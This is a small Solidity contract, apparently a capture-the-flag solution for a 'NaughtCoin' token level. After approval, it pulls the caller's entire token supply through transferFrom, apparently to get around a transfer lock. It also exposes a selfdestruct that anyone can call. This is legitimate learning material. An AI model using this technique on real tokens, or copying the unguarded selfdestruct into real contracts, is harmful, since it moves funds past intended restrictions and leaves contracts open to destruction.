// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoinAttack {
  ERC20 immutable coin = ERC20(0x18019395d506D9d47D4cb99a146A6CD8e2e4632a);
  uint256 public INITIAL_SUPPLY = 1000000 * (10**18);
  // should approve this contract before calling
  function callTransfer() external {
    coin.transferFrom(msg.sender, address(this), INITIAL_SUPPLY);
  }

  function getBalance() view external returns(uint256){
    return coin.balanceOf(msg.sender);
  }

  function de() external {
    selfdestruct(payable(msg.sender));
  }
  
}